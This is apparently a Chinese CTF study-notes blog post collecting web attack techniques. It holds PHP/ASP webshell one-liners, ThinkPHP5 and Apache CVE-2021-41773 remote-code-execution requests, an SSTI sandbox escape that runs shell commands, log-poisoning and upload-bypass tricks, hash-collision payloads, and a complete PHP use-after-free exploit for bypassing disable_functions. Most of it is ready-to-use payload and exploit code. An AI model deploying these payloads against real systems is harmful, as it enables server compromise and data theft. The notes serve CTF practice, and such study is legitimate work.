---
title: interesting
date: 2023-05-30 20:19:08
categories:
- 网络安全
tags:
- web 
description: |
    开始的开始
---
## Something interesting

### 神奇的Unicode编码

![都是假的](https://img.siren.blue/post_img/fununicode.png)

```php
<?php
error_reporting(0);
include "flag.php";
// ‮⁦NISACTF⁩⁦Welcome to
if ("jitanglailo" == $_GET[ahahahaha] &‮⁦+!!⁩⁦& "‮⁦ Flag!⁩⁦N1SACTF" == $_GET[‮⁦Ugeiwo⁩⁦cuishiyuan]) { //tnnd! weishenme b
    echo $FLAG;
}
show_source(__FILE__);
?>
<?php
error_reporting(0);
include "flag.php";
// ‮⁦ Spirit⁩⁦Welcome to
if ("App1eTree" == $_GET[spirit] &‮⁦QAQ⁩⁦& "‮⁦ Flag!⁩⁦SpiritCTF" == $_GET[‮⁦give_you⁩⁦2023]) {
    echo $FLAG;
}
show_source(__FILE__);
?>
<?php
error_reporting(0);
// ‮⁦ Spirit⁩⁦Welcome to
if ("App1eTree" == $_GET['spirit'] && "‮⁦ Flag!⁩⁦SpiritCTF" == $_GET[‮⁦give_you⁩⁦2023]) {
    echo $FLAG;
}else {
    echo "Welcome to Spirit CTF 2023(but warm)!";
}
show_source(__FILE__);
?>
```

我们cv下来，貌似没有变化，cv到文件，用010打开看看二进制。

![这是真的](https://img.siren.blue/post_img/fununicode1.png)

真奇妙对吧。 什么原理呢

其实粘贴后可以看到，代码中出现了`U+202E`,`U+2066`,`U+2069`,那这些东西是什么呢。

直接解释：`U+202E`是从右往左强制符；`U+2066`是这之间的字符从左到右显示，不影响外围字符；`U+2069`是作为RLI、LRI、FSi翻转结束的标识。
题目：[NISACTF 2022]checkin

### md5硬碰撞和sha1硬碰撞

md5:

```bash
a=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab
&b=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab
&c=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab
```

sha1:

```bash
 array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
```

```bash
 array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
```

### 绝对路径拼接漏洞

os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。

然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径

os.path.join 在win系统下遇到反斜杠和斜杠都在此处截断，在linux 系统下遇到斜杠会截断，反斜杠不会，在拼接路径时一定要把开头处的斜杠或者反斜杠处理掉，要不然会出现找不到路径的情况

### cve-2020-7066

在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，将get_headers（）与用户提供的URL一起使用时，如果URL包含零（\ 0）字符，则URL将被静默地截断。这可能会导致某些软件对get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。

`?url=http://127.0.0.123%00.ctfhub.com`
eg:[GKCTF 2020]cve

### MIME绕过

常见MIME类型

```bash
text/plain（纯文本）
text/html（HTML文档）
text/javascript（js代码）
application/xhtml+xml（XHTML文档）
image/gif（GIF图像）
image/jpeg（JPEG图像）
image/png（PNG图像）
video/mpeg（MPEG动画）
application/octet-stream（二进制数据）
application/pdf（PDF文档）
```

### 一句话

- php:

```php
<?php eval($_POST1);?> 
<?php @eval($_POST['value']);?>
<?php if(isset($_POST['c'])){eval($_POST['c']);}?> 
<?php system($_REQUEST1);?> 
<?php ($_=@$_GET1).@$_($_POST1)?> 
<?php eval_r($_POST1)?> 
<?php @eval_r($_POST1)?>//容错代码 
<?php @eval($_POST[sb])?>
<?php assert($_POST1);?>//使用Lanker一句话客户端的专家模式执行相关的PHP语句 
<?$_POST['c']($_POST['cc']);?> 
<?$_POST['c']($_POST['cc'],$_POST['cc'])?> 
<?php @preg_replace("/[email]/e",$_POST['h'],"error");?>/*使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入*/:<O>h=@eval_r($_POST1);</O> 
<?php echo `$_GET['r']` ?> 
//绕过<?限制的一句话 
<script language="php">@eval_r($_POST[sb])</script> 
<?php eval($_POST[sb])?>
<?php assert($_POST[sb]);?>
<?$_POST['sa']($_POST['sb']);?>
<?$_POST['sa']($_POST['sb'],$_POST['sc'])?>
<?php @preg_replace("/[emai]/e",$_POST['h'],"error");?>
<script language="php">@eval($_POST[sb])</script>   //绕过<?
```

- asp:

```php
<%eval request("MH")%>

<%execute request("MH")%>

<%execute(request("MH"))%>

<%If Request("MH")<>"" Then Execute(Request("MH"))%>

<%if request ("MH")<>""then session("MH")=request("MH"):end if:if session("MH")<>"" then execute session("MH")%>

<SCRIPT language=VBScript runat="server">execute request("MH")</SCRIPT>

<%@ Page Language="Jscript"%>

<%eval(Request.Item["MH"],"unsafe");%>

```

- aspx:

```php
<%@ Page Language="Jscript"%>
<%eval(Request.Item["value"])%>
```

### OPTIONS

`curl -i -X OPTIONS "http://node4.anna.nssctf.cn:28513/index.php"`

OPTIONS 请求方法是用于描述目标资源所支持的通信选项。返回的响应可以列出该资源支持的方法，如 GET，POST，DELETE 等，也可以显示关于资源的其他信息。

如果PUT是允许的，可以上马

### json_decode和字符串弱比较

```php
json_decode($a)函数，正常情况下这个函数能将字符串转换成数组然后返回，但是少数情况下它会放飞自我。比如传入true会返回true,传入false会返回false，传入NULL会返回NULL
```

如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行

### thinkphp5之rce

```php
5.1x:
?s=index/\think\Request/input&filter[]=system&data=pwd
?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

```php
5.0x:
?s=index/think\config/get&name=database.username // 获取配置信息
?s=index/\think\Lang/load&file=../../test.jpg    // 包含任意文件
?s=index/\think\Config/load&file=../../t.php     // 包含任意.php文件
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
```

```bash
http://php.local/thinkphp5.0.5/public/index.php?s=index
post
_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
_method=__construct&filter[]=system&method=GET&get[]=whoami

# ThinkPHP <= 5.0.13
POST /?s=index/index
s=whoami&_method=__construct&method=&filter[]=system

# ThinkPHP <= 5.0.23、5.1.0 <= 5.1.16 需要开启框架app_debug
POST /
_method=__construct&filter[]=system&server[REQUEST_METHOD]=ls -al

# ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captcha
POST /?s=xxx HTTP/1.1
_method=__construct&filter[]=system&method=get&get[]=ls+-al
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
```

### ssti

![sstitest](https://img.siren.blue/post_img/sstitest.png)

```bash
{$smarty.version}
${smarty.template}

data={{handler.setting}}
```

```bash
(1){{()['__cla''ss__'].__bases__[0]['__subcl''asses__']()}}
```

```python
import json
classes="""
[(1)]
"""
num=0
alllist=[]
result=""
for i in classes:
    if i==">":
        result+=i
        alllist.append(result)
        result=""
    elif i=="\n" or i==",":
        continue
    else:
        result+=i
#寻找要找的类，并返回其索引
for k,v in enumerate(alllist):
    if "warnings.catch_warnings" in v:
        print(str(k)+"--->"+v)
#117---> <class 'warnings.catch_warnings'>
```

`{{()['__cla''ss__'].__bases__[0]['__subcl''asses__']()[117].__init__.__globals__['__buil''tins__']['ev''al']("__im""port__('o''s').po""pen('whoami').read()")}}`

### 文件包含

```bash
#函数查找字符串在另一字符串中第一次出现的位置（区分大小写） 
#strpos("You love php, I love php too!","php");
...url/?file=shell.txt
构造post：ctfhub=system("cat /flag");
```

file_get_contents 在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录,可以配合进行目录穿越

#### php://input#从输入中读取

eg: `<?php system("ls");?>`

#### php://filter#1

`php://filter/read=filter_name/resource=resource_url`
filter_name：要应用的过滤器名称
resource_url：要读取的资源的URL
eg:`file=php://filter/read=convert.base64-encode/resource=/flag`
详细见 `##### php://filter`

#### data协议

data协议可以用来执行代码

data://text/plain;base64,
file_get_contents()的$filename参数不仅仅为本地文件路径，还可以是一个网络路径URL
eg:`text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=`
`file=data://text/plain,<?php%20phpinfo();?>`
`data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==`#cat flag.php

#### 日志文件包含漏洞

- apache服务器
日志存放文件位置：

```bash
/var/log/apache/access.log
/var/log/apache2/access.log
/var/www/logs/access.log
/var/log/access.log
/etc/httpd/logs/access_log
/var/log/httpd/access_log
配置：
/etc/apache2/apache2.conf
/etc/httpd/conf/httpd.conf
```

apache日志文件存放着我们输入的url参数
我们可以通过在url参数中写入一句话木马，进行执行，从而将一句话木马写入到日志文件中，我们可以通过包含写入木马的日志文件，从而进行命令执行。

- nginx服务器
日志存放位置：

```bash
日志：
/var/log/nginx/access.log
/var/log/nginx/error.log
配置：
/etc/nginx/nginx.conf
/usr/local/nginx/conf/nginx.conf
```

由本地日志文件可以看到nginx服务器中记录的是每次请求user-agent报文，那么我们可以通过包含nginx'服务器的日志文件，然后在user-agent服务器中写入木马语句进行注入

#### 绕过disable_function

```php
#pdo运用mysql读取文件
c=
try {
    $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',
        'root');
 
    foreach ($dbh->query('select load_file("/flag36.txt")') as $row) {
        echo ($row[0]) . "|";
    }
    $dbh = null;
} catch (PDOException $e) {
    echo $e->getMessage();
    exit(0);
}
exit(0);
```

```php
#uaf 绕过open_basedir和disable_functions的限制
c=
pwn("ls /;cat /flag0.txt");
 
function pwn($cmd) {
    global $abc, $helper, $backtrace;
    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }
 
    class Helper {
        public $a, $b, $c, $d;
    }
 
    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }
 
    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf('%c',$ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }
 
    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf('%c',$v & 0xff);
            $v >>= 8;
        }
    }
 
    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }
 
    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);
 
        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);
 
        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);
 
            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }
 
        if(!$data_addr || !$text_size || !$data_size)
            return false;
 
        return [$data_addr, $text_size, $data_size];
    }
 
    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;
 
            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;
 
            return $data_addr + $i * 8;
        }
    }
 
    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }
 
    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);
 
            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
 
    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }
 
    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }
 
    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
 
    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];
 
    $helper = new Helper;
    $helper->b = function ($x) { };
 
    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }
 
    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;
 
    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);
 
    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);
 
    $closure_obj = str2ptr($abc, 0x20);
 
    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }
 
    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }
 
    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }
 
    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }
 
    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }
 
    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
 
    ($helper->b)($cmd);
    exit();
}

```

### jinja脚本fenjing

```bash
- scan: 扫描整个网站
- crack: 对某个特定的表单进行攻击
 
Usage: python -m fenjing scan [OPTIONS]
 
Options:
  --url TEXT       需要扫描的URL
  --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
  --help           Show this message and exit.
 
Usage: python -m fenjing crack [OPTIONS]
 
Options:
  --url TEXT       form所在的URL
  --action TEXT    form的action，默认为当前路径
  --method TEXT    form的提交方式，默认为POST
  --inputs TEXT    form的参数，以逗号分隔
  --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
  --help           Show this message and exit.
```

eg:`python -m fenjing crack --url 'http://node2.anna.nssctf.cn:28823/get_flag' --method POST --inputs name --action get_flag`

### Apache HTTP Server 2.4.49 CVE-2021-41773

攻击者可以使用路径遍历攻击将URL映射到预期文档根以外的文件。如果文档根目录以外的文件不受require all denied保护，则攻击者可以访问这些文件。

```bash
任意文件读取POC：
GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: x.x.x.x:8080


RCE：
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: 192.168.109.128:8080
.....
echo; grep -r "NSS" /flag_is_here
```

### tapcode敲击码

我也很茫然
![敲击码](https://img.siren.blue/post_img/%E6%95%B2%E5%87%BB%E7%A0%81.webp)
附上解密网站
[在线解密网站](http://www.hiencode.com/tapcode.html)
空格影响结果哦

```bash
POST /test.php?1[]=test&1[]=var_dump($_SERVER);&2=assert HTTP/1.1
Host: localhost:8081
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

param=usort(...$_GET);
```

[附上链接日后钻研](https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html)
[有空研究](https://www.cnblogs.com/-chenxs/p/11981586.html)

### proc

- cmdline
cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令
- cwd
cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录 eg:`proc/self/cwd/index.php`
- exe
exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径
- environ
environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息
- fd
fd 是一个目录，里面包含这当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容
这个fd比较重要，因为在 linux 系统中，如果一个程序用`open()`打开了一个文件但最终没有关闭他，即便从外部（如`os.remove(SECRET_FILE))`删除这个文件之后，在 `/proc` 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。
- self
上面这些操作列出的都是目标环境指定进程的信息，但是我们在做题的时候往往需要的当前进程的信息，这时候就用到了 /proc 目录中的 self 子目录。

`/proc/self` 表示当前进程目录。前面说了通过 `/proc/$pid/` 来获取指定进程的信息。如果某个进程想要获取当前进程的系统信息，就可以通过进程的pid来访问`/proc/$pid/`目录。但是这个方法还需要获取进程pid，在`fork`、`daemon`等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了 `/proc/self/`目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于 `/proc/`本进程`pid/` 。进程可以通过访问 `/proc/self/` 目录来获取自己的系统信息，而不用每次都获取`pid`。

有了`self`目录就方便多了，下面我们演示一下`self`的常见使用

```bash
ls -al /proc/self/cwd
ls /proc/self/cwd
ls -al /proc/self/exe
cat /proc/self/environ
cat /proc/self/fd/{id}
```

在真正做题的时候，我们是不能通过命令的方式执行通过cat命令读取cmdline的，因为如果是cat读取/proc/self/cmdline的话，得到的是cat进程的信息，所以我们要通过题目的当前进程使用读取文件（如文件包含漏洞，或者SSTI使用file模块读取文件）的方式读取/proc/self/cmdline。

### SUID提权

```bash
# 搜索 SUID file 可执行文件
find / -type f -perm /4000 2>/dev/null
# 利用 sed 命令查看 flag
/bin/sed '1p' /flag
```

Nmap，Vim，find，Bash，More，Less，Nano，cp等

### 文件上传

尝试特殊解析漏洞：php3,php5,phtml ； 大小写绕过：PHP,pHP； 点绕过：php.； 空格绕过：php空格；::$$DATA绕过：shell.php::$$DATA；双后缀：shell.phphpp；单循环绕过：shell.php. .；假文件名绕过：shell.php/.

.htaccess绕过和.user.ini绕过

```php
.htaccess绕过：
GIF89a
<FilesMatch “shell.jpg”>
SetHandler application/x-httpd-php
</FilesMatch>
```

```php
GIF89a
auto_prepend_file=shell.jpg
注：用蚁剑或菜刀链接实路径的shell.jpg改为index.php
```

!!!记得修改MIME的值 eg:image/jpeg

### 信息泄漏之域名解析

```bash
╰─ nslookup -query=any flag.ctfshow.com                                                                                    ─╯
Server:198.18.0.2
Address:198.18.0.2#53

Non-authoritative answer:
flag.ctfshow.com text = "flag{just_seesee}"

Authoritative answers can be found from:
```

### 信息泄漏之php探针

```php
考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag
```
